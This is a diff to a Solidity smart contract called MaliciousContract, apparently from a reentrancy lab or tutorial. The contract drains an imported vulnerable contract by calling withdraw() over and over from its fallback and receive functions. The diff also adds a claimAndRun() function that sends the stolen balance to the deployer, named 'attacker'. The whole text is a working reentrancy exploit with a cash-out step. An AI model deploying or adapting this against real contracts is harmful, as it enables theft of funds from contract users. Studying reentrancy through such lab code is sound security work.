@@ -5,42 +5,40 @@ import "./VulnerableContract.sol";
 
 contract MaliciousContract {
     address payable public vulnerableScAddress;
+    address payable public attacker;
 
     constructor(address payable _vulnerableScAddress) {
         vulnerableScAddress = _vulnerableScAddress;
+        attacker = payable(msg.sender);
     }
 
     fallback() external payable {
         // Recursive call until funds are drained.
         if (vulnerableScAddress.balance >= 1 ether) {
-            (bool success, ) = vulnerableScAddress.call(
-                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
-            );
-            require(success, "withdraw failed.");
+            vulnerableScAddress.call(abi.encodeWithSignature("withdraw()"));
         }
     }
 
     receive() external payable {
         // Recursive call until funds are drained.
         if (vulnerableScAddress.balance >= 1 ether) {
-            (bool success, ) = vulnerableScAddress.call(
-                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
-            );
-            require(success, "withdraw failed.");
+            vulnerableScAddress.call(abi.encodeWithSignature("withdraw()"));
         }
     }
 
-    function attack() public {
+    function attack() public payable {
         // Deposits first time.
-        (bool success, ) = vulnerableScAddress.call{value: 1 ether}(
+        require(msg.value >= 1 ether, "Need to send at least 1 eth.");
+        vulnerableScAddress.call{value: msg.value}(
             abi.encodeWithSignature("deposit()")
         );
-        require(success, "deposit failed.");
 
         // Triggers withraw vulnerability.
-        (bool success2, ) = vulnerableScAddress.call(
-            abi.encodeWithSignature("withdraw(uint256)", 1 ether)
-        );
-        require(success2, "withdraw failed.");
+        vulnerableScAddress.call(abi.encodeWithSignature("withdraw()"));
+    }
+
+    function claimAndRun() public {
+        require(msg.sender == attacker, "not your bounty, buddy.");
+        attacker.transfer(address(this).balance);
     }
 }
